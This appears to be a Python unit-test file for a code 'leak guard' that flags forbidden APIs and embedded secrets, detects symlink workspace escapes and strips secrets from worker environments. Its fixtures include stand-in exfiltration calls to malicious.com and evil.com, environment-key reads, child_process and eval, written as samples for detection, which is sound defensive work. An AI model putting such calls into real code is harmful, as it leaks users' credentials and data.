"""Unit tests for Editorial Security Leak-Guard (RULES §7)."""

from pathlib import Path
import pytest

from clipforge.editorial.leak_guard import (
    audit_workspace_security,
    get_clean_worker_env,
    scan_code_string,
)


def test_leak_guard_rejects_forbidden_apis():
    bad_snippets = [
        ("console.log(process.env.OPENAI_API_KEY)", "process.env"),
        ("const { exec } = require('child_process');", "child_process"),
        ("import fs from 'fs';", "fs"),
        ("const res = eval('2 + 2');", "eval"),
        ("const fn = new Function('return 1');", "Function"),
        ("fetch('https://malicious.com/exfil')", "fetch"),
        ("const ws = new WebSocket('ws://evil.com');", "WebSocket"),
    ]

    for snippet, name in bad_snippets:
        errors = scan_code_string(snippet, filename="BadComponent.tsx")
        assert len(errors) > 0, f"Failed to detect forbidden API: {name}"
        assert any(name in err for err in errors)


def test_leak_guard_detects_secrets():
    secret_snippets = [
        "const key = 'sk-proj-12345678901234567890abcdef';",
        "const aws = 'AKIAIOSFODNN7EXAMPLE';",
        "const gh = 'ghp_abcdefghijklmnopqrstuvwxyz0123456789';",
        "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0...",
    ]

    for snippet in secret_snippets:
        errors = scan_code_string(snippet, filename="Secrets.ts")
        assert len(errors) > 0, f"Failed to catch secret in snippet: {snippet[:25]}"


def test_leak_guard_accepts_clean_code():
    clean_code = """
    import React from 'react';
    import { AbsoluteFill, useCurrentFrame } from 'remotion';

    export const SafeComponent: React.FC = () => {
      const frame = useCurrentFrame();
      return (
        <AbsoluteFill style={{ backgroundColor: '#000' }}>
          <h1>Frame: {frame}</h1>
        </AbsoluteFill>
      );
    };
    """
    errors = scan_code_string(clean_code, filename="SafeComponent.tsx")
    assert len(errors) == 0


def test_workspace_audit_detects_symlink_escape(tmp_path: Path):
    ws_dir = tmp_path / "workspace_test"
    ws_dir.mkdir()
    outside_dir = tmp_path / "outside_secret"
    outside_dir.mkdir()
    (outside_dir / "secret.txt").write_text("SUPER_SECRET_KEY")

    # Create escaping symlink inside workspace
    escape_link = ws_dir / "leaky_symlink"
    escape_link.symlink_to(outside_dir)

    res = audit_workspace_security(ws_dir)
    assert not res["passed"]
    assert any("Symlink directory escape" in err for err in res["errors"])


def test_clean_worker_env_whitelisting(monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "sk-secret-backend-key")
    monkeypatch.setenv("DATABASE_URL", "postgres://user:pass@host/db")
    monkeypatch.setenv("JWT_SECRET", "super-secret-token")
    monkeypatch.setenv("PATH", "/usr/bin:/bin")

    clean_env = get_clean_worker_env()

    assert "PATH" in clean_env
    assert "OPENAI_API_KEY" not in clean_env
    assert "DATABASE_URL" not in clean_env
    assert "JWT_SECRET" not in clean_env
